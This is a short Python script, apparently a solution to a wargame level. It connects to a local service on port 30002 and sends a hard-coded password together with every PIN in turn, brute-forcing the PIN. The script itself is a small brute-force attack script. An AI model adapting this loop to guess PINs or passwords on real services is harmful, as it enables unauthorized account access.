import socket

password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
pin = 0

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', int(30002)))
s.recv(4096)
while True:
    print("[+] Sending PIN " + str(pin))
    content = password + " " + str(pin)
    s.sendall(content.encode())
    data = s.recv(4096)
    print(repr(data))
    pin = pin + 1
s.close()
